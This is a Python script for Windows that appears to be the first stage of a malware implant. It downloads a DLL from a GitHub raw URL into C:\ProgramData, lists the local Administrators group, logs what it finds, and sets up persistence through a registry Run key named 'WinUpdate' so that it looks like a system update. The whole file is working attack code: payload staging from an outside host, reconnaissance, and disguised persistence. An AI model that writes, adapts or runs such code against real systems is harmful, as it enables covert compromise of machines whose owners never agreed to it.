import os
import subprocess
import urllib.request
import winreg

# ═══════════════════════════════════════════════
# CONFIGURATION
# ═══════════════════════════════════════════════
dll_url   = "https://raw.githubusercontent.com/adstudy182-debug/Demo_Work/main/V3/TEST_Dll1.dll"
dll_path  = r"C:\ProgramData\TEST_Dll1.dll"
log_path  = r"C:\ProgramData\stage1.log"
self_py   = r"C:\ProgramData\hklib.py"
self_exe  = r"C:\ProgramData\py3\python.exe"
reg_name  = "WinUpdate"

# ═══════════════════════════════════════════════
# PHASE 1: DLL Staging (download only if not present)
# ═══════════════════════════════════════════════
if os.path.exists(dll_path):
    with open(log_path, 'a') as f:
        f.write(f"[SKIP] DLL already staged at {dll_path}\n")
else:
    try:
        urllib.request.urlretrieve(dll_url, dll_path)
        with open(log_path, 'a') as f:
            f.write(f"[OK] DLL staged to {dll_path}\n")
    except Exception as e:
        with open(log_path, 'a') as f:
            f.write(f"[ERR] Download failed: {e}\n")

# ═══════════════════════════════════════════════
# PHASE 2: Local Admin Enumeration (always runs)
# ═══════════════════════════════════════════════
try:
    result = subprocess.run(
        ['net', 'localgroup', 'Administrators'],
        capture_output=True, text=True
    )
    with open(log_path, 'a') as f:
        f.write("=== Local Admin Group ===\n")
        f.write(result.stdout)
        f.write("=========================\n")
except Exception as e:
    with open(log_path, 'a') as f:
        f.write(f"[ERR] Enumeration failed: {e}\n")

# ═══════════════════════════════════════════════
# PHASE 3: Self-Persistence (Registry Run Key)
# ═══════════════════════════════════════════════
reg_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
reg_val = f'"{self_exe}" "{self_py}"'

try:
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_key, 0, winreg.KEY_READ)
    existing, _ = winreg.QueryValueEx(key, reg_name)
    winreg.CloseKey(key)
    with open(log_path, 'a') as f:
        f.write(f"[SKIP] Run key '{reg_name}' already exists.\n")
except FileNotFoundError:
    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_key)
        winreg.SetValueEx(key, reg_name, 0, winreg.REG_SZ, reg_val)
        winreg.CloseKey(key)
        with open(log_path, 'a') as f:
            f.write(f"[OK] Self-persistence established via Registry Run key '{reg_name}'.\n")
    except Exception as e:
        with open(log_path, 'a') as f:
            f.write(f"[ERR] Registry persistence failed: {e}\n")
